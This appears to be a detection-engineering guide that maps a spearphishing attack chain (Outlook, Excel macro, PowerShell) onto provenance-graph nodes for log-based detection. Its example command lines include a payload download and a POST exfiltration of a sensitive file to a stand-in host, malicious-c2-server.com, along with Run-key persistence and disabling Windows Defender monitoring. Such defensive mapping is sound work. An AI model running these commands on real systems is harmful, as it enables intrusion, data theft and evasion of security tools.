1. **Identify Initial Access via Spearphishing Email**  
   - Map the event where the user opens Outlook to check for the process creation of Outlook.  
   - Target the `srcNode` with:  
     - `Image`: `"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"`  
     - `relation`: `"Process Start"`  
   - Ensure the `timestamp` reflects the time the email is opened.

2. **Detect Opening of Malicious Attachment**  
   - Look for the execution of Excel when the user opens the malicious attachment.  
   - Map the `srcNode` to:  
     - `Image`: `"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"`  
     - `relation`: `"Process Start"`  
   - The `dstNode` should reflect the Excel file being opened:  
     - `Name`: `"Invoice_2023.xlsx"`  
     - `Type`: `"File"`  
   - Ensure the `timestamp` corresponds to the time the attachment is opened.

3. **Monitor Execution of the PowerShell Command**  
   - Detect the execution of PowerShell initiated by the Excel macro.  
   - Map the `srcNode` to:  
     - `Image`: `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"`  
     - `Cmdline`: `"-ExecutionPolicy Bypass -File C:\\Users\\User\\Downloads\\malicious_script.ps1"`  
     - `relation`: `"Process Start"`  
   - Ensure the `timestamp` matches the execution time of the PowerShell command.

4. **Capture Payload Download and Execution**  
   - Identify the PowerShell command that downloads and executes the payload.  
   - Map the `srcNode` to:  
     - `Image`: `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"`  
     - `Cmdline`: `"Invoke-WebRequest -Uri \"http://malicious-c2-server.com/payload.exe\" -OutFile \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\""`  
     - `relation`: `"Process Start"`  
   - The `dstNode` should reflect the downloaded payload:  
     - `Image`: `"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"`  
     - `Type`: `"Process"`  
   - Ensure the `timestamp` corresponds to the download and execution time.

5. **Detect Registry Modification for Persistence**  
   - Monitor for registry changes made by the payload to establish persistence.  
   - Map the `srcNode` to:  
     - `Image`: `"powershell.exe"`  
     - `Cmdline`: `"New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MaliciousApp\" -Value \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\" -PropertyType String"`  
     - `relation`: `"Process Start"`  
   - The `dstNode` should reflect the registry key being modified:  
     - `Key`: `"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"`  
     - `Type`: `"Registry"`  
   - Ensure the `timestamp` matches the time of the registry modification.

6. **Monitor Evasion of Security Mechanisms**  
   - Detect attempts to disable Windows Defender or other security features.  
   - Map the `srcNode` to:  
     - `Image`: `"powershell.exe"`  
     - `Cmdline`: `"Set-MpPreference -DisableRealtimeMonitoring $true"`  
     - `relation`: `"Process Start"`  
   - Ensure the `timestamp` reflects the time of the command execution.

7. **Capture Data Exfiltration Attempts**  
   - Identify network traffic related to data exfiltration to the attacker's server.  
   - Map the `srcNode` to:  
     - `Image`: `"powershell.exe"`  
     - `Cmdline`: `"Invoke-WebRequest -Uri \"http://malicious-c2-server.com/exfiltrate\" -Method POST -Body (Get-Content \"C:\\Users\\User\\Documents\\sensitive_data.txt\")"`  
     - `relation`: `"Process Start"`  
   - The `dstNode` should reflect the network connection:  
     - `Dstaddress`: `"malicious-c2-server.com"`  
     - `Port`: `80` (or `443` if using HTTPS)  
     - `Type`: `"Network"`  
   - Ensure the `timestamp` corresponds to the time of the exfiltration attempt.